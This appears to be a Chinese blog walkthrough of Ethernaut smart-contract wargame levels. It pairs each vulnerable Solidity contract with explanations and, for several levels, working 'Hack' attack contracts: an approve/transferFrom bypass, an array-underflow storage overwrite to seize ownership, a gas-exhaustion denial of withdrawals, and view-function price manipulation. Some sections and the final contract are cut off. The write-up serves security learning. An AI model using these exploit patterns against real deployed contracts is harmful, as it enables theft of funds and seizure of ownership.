class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &#x27;openzeppelin-contracts-08/token/ERC20/ERC20.sol&#x27;;<br><br> contract NaughtCoin is ERC20 &#123;<br><br>  // string public constant name = &#x27;NaughtCoin&#x27;;<br>  // string public constant symbol = &#x27;0x0&#x27;;<br>  // uint public constant decimals = 18;<br>  uint public timeLock = block.timestamp + 10 * 365 days;<br>  uint256 public INITIAL_SUPPLY;<br>  address public player;<br><br>  constructor(address _player) <br>  ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;) &#123;<br>    player = _player;<br>    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));<br>    // _totalSupply = INITIAL_SUPPLY;<br>    // _balances[player] = INITIAL_SUPPLY;<br>    _mint(player, INITIAL_SUPPLY);<br>    emit Transfer(address(0), player, INITIAL_SUPPLY);<br>  &#125;<br>  <br>  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;<br>    super.transfer(_to, _value);<br>  &#125;<br><br>  // Prevent the initial owner from transferring tokens until the timelock has passed<br>  modifier lockTokens() &#123;<br>    if (msg.sender == player) &#123;<br>      require(block.timestamp &gt; timeLock);<br>      _;<br>    &#125; else &#123;<br>     _;<br>    &#125;<br>  &#125; <br>&#125; <br></code></pre></td></tr></table></figure>
<p>整个合约中只有transfer()一个函数进行余额转移，同时这个函数受到lockTokens的限制只能在十年后才可以调用。因此我们只能通过其他手段，</p>
<p>合约导入了ERC20，所以对于代币的转移除了transfer还有transferfrom方法，只需要注意transfrom函数还需要额外的操作：approve。</p>
<p>整个过程就是：在生成实例后，通过调用ERC20的approve批准将代币转移到攻击合约或其他地方，然后进行transferfrom调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br><br>  function pwn(IERC20 coin) external &#123;<br>    address player = NaughtCoin(address(coin)).player();<br>    uint amount = coin.balanceOf(player);<br><br>    coin.transferFrom(player, address(this), amount);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h1 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h1><p>任务要求：拥有合约的所有权。</p>
<p><strong>源代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Preservation &#123;<br><br>  // public library contracts <br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  // Sets the function signature for delegatecall<br>  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br><br>  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;<br>    timeZone1Library = _timeZone1LibraryAddress; <br>    timeZone2Library = _timeZone2LibraryAddress; <br>    owner = msg.sender;<br>  &#125;<br> <br>  // set the time for timezone 1<br>  function setFirstTime(uint _timeStamp) public &#123;<br>    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br><br>  // set the time for timezone 2<br>  function setSecondTime(uint _timeStamp) public &#123;<br>    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br>&#125;<br><br>// Simple library contract to set the time<br>contract LibraryContract &#123;<br><br>  // stores a timestamp <br>  uint storedTime;  <br><br>  function setTime(uint _time) public &#123;<br>    storedTime = _time;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>在合约中，只有在部署时初始化了owner状态，因此我们对于直接调用某个函数进行owner更新是没有办法的。</p>
<p>先不要慌，来看看合约中还干了些什么：</p>
<hr>
<h1 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h1><p>任务要求：从丢失的账户中找回代币。</p>
<p><strong>源代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Recovery &#123;<br><br>  //generate tokens<br>  function generateToken(string memory _name, uint256 _initialSupply) public &#123;<br>    new SimpleToken(_name, msg.sender, _initialSupply);<br>  <br>  &#125;<br>&#125;<br><br>contract SimpleToken &#123;<br><br>  string public name;<br>  mapping (address =&gt; uint) public balances;<br><br>  // constructor<br>  constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;<br>    name = _name;<br>    balances[_creator] = _initialSupply;<br>  &#125;<br><br>  // collect ether in return for tokens<br>  receive() external payable &#123;<br>    balances[msg.sender] = msg.value * 10;<br>  &#125;<br><br>  // allow transfers of tokens<br>  function transfer(address _to, uint _amount) public &#123; <br>    require(balances[msg.sender] &gt;= _amount);<br>    balances[msg.sender] = balances[msg.sender] - _amount;<br>    balances[_to] = _amount;<br>  &#125;<br><br>  // clean up after ourselves<br>  function destroy(address payable _to) public &#123;<br>    selfdestruct(_to);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>根据题目大意，在通过Recovery部署的一个SimpToken合约地址丢失了，该合约还含有0.001eth。因此，我们要做的就是1、找回SimpleToken合约的地址。2、回收其0.001ether。</p>
<p>通过payable关键字可以查到SimpleToken合约中通过receive函数接受ether，同时通过destroy可以向外发送ether，因此只需要能够找到该合约地址并调用destroy方法，那么就能够通过挑战。</p>
<p>那么怎么获得一个地址呢？首先我们可以接助区块链浏览器查询，但这样的效率太低。因此我们使用另一种办法：构造地址</p>
<p><strong>以太坊生成地址的逻辑</strong>：</p>
<hr>
<h1 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h1><p>任务要求：构造一个合约，使其能够返回正确数字。</p>
<p><strong>源代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract MagicNum &#123;<br><br>  address public solver;<br><br>  constructor() &#123;&#125;<br><br>  function setSolver(address _solver) public &#123;<br>    solver = _solver;<br>  &#125;<br><br>  /*<br>    ____________/\\\_______/\\\\\\\\\_____        <br>     __________/\\\\\_____/\\\///////\\\___       <br>      ________/\\\/\\\____\///______\//\\\__      <br>       ______/\\\/\/\\\______________/\\\/___     <br>        ____/\\\/__\/\\\___________/\\\//_____    <br>         __/\\\\\\\\\\\\\\\\_____/\\\//________   <br>          _\///////////\\\//____/\\\/___________  <br>           ___________\/\\\_____/\\\\\\\\\\\\\\\_ <br>            ___________\///_____\///////////////__<br>  */<br>&#125;<br></code></pre></td></tr></table></figure>
<p>但题目中额外要求：要求不超过10opcodes，也就意味着我们不能通过常规的编写方法来完成这关。</p>
<p>需要通过字节码来创建一个简单的智能合约，而在这个网站我找到了需要的字节码：<a target="_blank" rel="noopener" href="https://solidity-by-example.org/app/simple-bytecode-contract/">Simple Bytecode Contract</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  constructor (MagicNum target) &#123;<br>    address addr;<br>    bytes memory bytecode = hex&quot;69602a60005260206000f3600052600a6016f3&quot;;<br><br>    assembly &#123;<br>      addr := create(0, add(bytecode, 0x20), 0x13)<br>    &#125;<br>    target.setSolver(addr);<br>  &#125; <br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h1 id="Alice-Codex"><a href="#Alice-Codex" class="headerlink" title="Alice Codex"></a>Alice Codex</h1><p>任务要求：获得合约的所有权。</p>
<p><strong>源代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.5.0;<br><br>import &#x27;../helpers/Ownable-05.sol&#x27;;<br><br>contract AlienCodex is Ownable &#123;<br><br>  bool public contact;<br>  bytes32[] public codex;<br><br>  modifier contacted() &#123;<br>    assert(contact);<br>    _;<br>  &#125;<br>  <br>  function makeContact() public &#123;<br>    contact = true;<br>  &#125;<br><br>  function record(bytes32 _content) contacted public &#123;<br>    codex.push(_content);<br>  &#125;<br><br>  function retract() contacted public &#123;<br>    codex.length--;<br>  &#125;<br><br>  function revise(uint i, bytes32 _content) contacted public &#123;<br>    codex[i] = _content;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>合约继承ownable合约，这个合约的第一个状态变量就是address owner，因此我们要做的就是想办法override这个owner状态变量。</p>
<p>在codex为0的时候调用retract，将会产生下溢，导致数组的长度变为2**256-1。</p>
<p>我们再来分析一下storage中的存储状态，在调用retract之前，<code>slot0 - owner（20bytes），contact（1byte），slot1 - length codex</code></p>
<p>对于数组元素则是：<code>slot h = codex[0],h=keccak256(1)</code>，整个codex数组占了2**256个槽。</p>
<p>因此我们要做的就是找到一个索引i，使得<code>slot h+i =slot 0</code>，也即是i&#x3D;-h这样的一个值，然后通过调用revise函数进行覆盖。</p>
<p>通过调用makeContact()来使我们能够进行retract()、revise()操作。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  constructor(AlienCodex target) &#123;<br>    target.makeContact();<br>    target.retract();<br><br>    uint256 h = uint256(keccak256(abi.encode(uint256(1))));<br>    uint256 i;<br>    unchecked &#123;<br>      i -= h;<br>    &#125;<br>    target.revise(i, byte32(uint256(uint160(msg.sender))));<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h1 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h1><p>任务要求：拒绝owner进行提款。</p>
<p><strong>源代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br>contract Denial &#123;<br><br>    address public partner; // withdrawal partner - pay the gas, split the withdraw<br>    address public constant owner = address(0xA9E);<br>    uint timeLastWithdrawn;<br>    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances<br><br>    function setWithdrawPartner(address _partner) public &#123;<br>        partner = _partner;<br>    &#125;<br><br>    // withdraw 1% to recipient and 1% to owner<br>    function withdraw() public &#123;<br>        uint amountToSend = address(this).balance / 100;<br>        // perform a call without checking return<br>        // The recipient can revert, the owner will still get their share<br>        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);<br>        payable(owner).transfer(amountToSend);<br>        // keep track of last withdrawal time<br>        timeLastWithdrawn = block.timestamp;<br>        withdrawPartnerBalances[partner] +=  amountToSend;<br>    &#125;<br><br>    // allow deposit of funds<br>    receive() external payable &#123;&#125;<br><br>    // convenience function<br>    function contractBalance() public view returns (uint) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>当有人调用withdraw函数时，会将一些资金发送回所有者，我们要做到就是在partner地址中能够使交易回退，就可以保证后续的代码无法执行。</p>
<p>仅仅通过revert()，我们无法拒绝提款，但可以通过消耗完gas，来拒绝交易进行。</p>
<p>在solidity0.8.0版本之前，我们可以通过assembly(false)来消耗完所有的gas，在此之后assembly(false)不会消耗完所有的gas了，但可以通过汇编中的invalid()达到相同的效果：<code>assembly&#123; invalid() &#125;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  constructor(Denial target) &#123;<br>    target.setWithdrawPartner(address(this));<br>  &#125;<br><br>  fallback() external payable &#123; <br>    assembly&#123;<br>      invalid()<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h1 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h1><p>任务要求：想办法薅。</p>
<p><strong>源代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>interface Buyer &#123;<br>  function price() external view returns (uint);<br>&#125;<br><br>contract Shop &#123;<br>  uint public price = 100;<br>  bool public isSold;<br><br>  function buy() public &#123;<br>    Buyer _buyer = Buyer(msg.sender);<br><br>    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;<br>      isSold = true;<br>      price = _buyer.price();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>因为合约对Buyer进行了两次price调用，那么我们可以在price函数中进行两次不同的操作，第一次正常大于价格，但在第二次调用时进行另一种逻辑，进行价格调整。</p>
<p>view函数不能编写任何状态变量，通过自身的isSold进行条件判断。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  Shop target;<br><br>  constructor(address _tar) &#123;<br>    target = Shop(_tar);<br>  &#125;<br>  function price() external view returns (uint) &#123;<br>    if (!target.isSold()) &#123;<br>      return 101;<br>    &#125; else &#123;<br>      return 0;<br>    &#125;<br>  &#125;<br><br>  function pwn() external &#123;<br>    target.buy();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h1 id="Dex"><a href="#Dex" class="headerlink" title="Dex"></a>Dex</h1><p>任务要求：窃取token1,token2的资金。</p>
<p><strong>源代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;<br>import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;<br>import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;<br><br>contract Dex is Ownable &#123;<br>  address public token1;<br>  address public token2;<br>  constructor() &#123;&#125;<br><br>  function setTokens(address _token1, address _token2) public onlyOwner &#123;<br>    token1 = _token1;<br>    token2 = _token2;<br>  &#125;<br>  <br>  function addLiquidity(address token_address, uint amount) public onlyOwner &#123;<br>    IERC20(token_address).transferFrom(msg.sender, address(this), amount);<br>  &#125;<br>  <br>  function swap(address from, address to, uint amount) public &#123;<br>    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);<br>    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);<br>    uint swapAmount = getSwapPrice(from, to, amount);<br>    IERC20(from).transferFrom(msg.sender, address(this), amount);<br>    IERC20(to).approve(address(this), swapAmount);<br>    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);<br>  &#125;<br><br>  function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;<br>    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));<br>  &#125;<br><br>  function approve(address spender, uint amount) public &#123;<br>    SwappableToken(token1).approve(msg.sender, spender, amount);<br>    SwappableToken(token2).approve(msg.sender, spender, amount);<br>  &#125;<br><br>  function balanceOf(address token, address account) public view returns (uint)&#123;<br>    return IERC20(token).balanceOf(account);<br>  &#125;<br>&#125;<br><br>contract SwappableToken is ERC20 &#123;<br>  address private _dex;<br>  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123;<br>    _mint(msg.sender, initialSupply);<br>    _dex = dexInstance;<br>  &#125;<br><br>  function approve(address owner, address spender, uint256 amount) public &#123;<br>    require(owner != _dex, &quot;InvalidApprover&quot;);<br>    super._approve(owner, spender, amount);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h1 id="Dex-Two"><a href="#Dex-Two" class="headerlink" title="Dex Two"></a>Dex Two</h1><p>任务要求：从DexTwo合约中提取token1和token2的所有余额才能通过此题。</p>
<p><strong>源代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;<br>import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;<br>import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;<br><br>contract DexTwo is Ownable &#123;<br>  address public token1;<br>  address public token2;<br>  constructor() &#123;&#125;<br><br>  function setTokens(address _token1, address _token2) public onlyOwner &#123;<br>    token1 = _token1;<br>    token2 = _token2;<br>  &#125;<br><br>  function add_liquidity(address token_address, uint amount) public onlyOwner &#123;<br>    IERC20(token_address).transferFrom(msg.sender, address(this), amount);<br>  &#125;<br>  <br>  function swap(address from, address to, uint amount) public &#123;<br>    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);<br>    uint swapAmount = getSwapAmount(from, to, amount);<br>    IERC20(from).transferFrom(msg.sender, address(this), amount);<br>    IERC20(to).approve(address(this), swapAmount);<br>    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);<br>  &#125; <br><br>  function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123;<br>    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));<br>  &#125;<br><br>  function approve(address spender, uint amount) public &#123;<br>    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);<br>    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);<br>  &#125;<br><br>  function balanceOf(address token, address account) public view returns (uint)&#123;<br>    return IERC20(token).balanceOf(account);<br>  &#125;<br>&#125;<br><br>contract SwappableTokenTwo is ERC20 &#123;<br>  address private _dex;<br>  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;<br>    _mint(msg.sender, initialSupply);<br>    _dex = dexInstance;<br>  &#125;<br><br>  function approve(address owner, address spender, uint256 amount) public &#123;<br>    require(owner != _dex, &quot;InvalidApprover&quot;);<br>    super._approve(owner, spender, amount);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h1 id="Puzzle-Wallet"><a href="#Puzzle-Wallet" class="headerlink" title="Puzzle Wallet"></a>Puzzle Wallet</h1><p>任务要求：</p>
<p><strong>源代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br>pragma experimental ABIEncoderV2;<br><br>import &quot;../helpers/UpgradeableProxy-08.sol&quot;;<br><br>contract PuzzleProxy is UpgradeableProxy &#123;<br>    address public pendingAdmin;<br>    address public admin;<br><br>    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123;<br>        admin = _admin;<br>    &#125;<br><br>    modifier onlyAdmin &#123;<br>      require(msg.sender == admin, &quot;Caller is not the admin&quot;);<br>      _;<br>    &#125;<br><br>    function proposeNewAdmin(address _newAdmin) external &#123;<br>        pendingAdmin = _newAdmin;<br>    &#125;<br><br>    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;<br>        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);<br>        admin = pendingAdmin;<br>    &#125;<br><br>    function upgradeTo(address _newImplementation) external onlyAdmin &#123;<br>        _upgradeTo(_newImplementation);<br>    &#125;<br>&#125;<br><br>contract PuzzleWallet &#123;<br>    address public owner;<br>    uint256 public maxBalance;<br>    mapping(address =&gt; bool) public whitelisted;<br>    mapping(address =&gt; uint256) public balances;<br><br>    function init(uint256 _maxBalance) public &#123;<br>        require(maxBalance == 0, &quot;Already 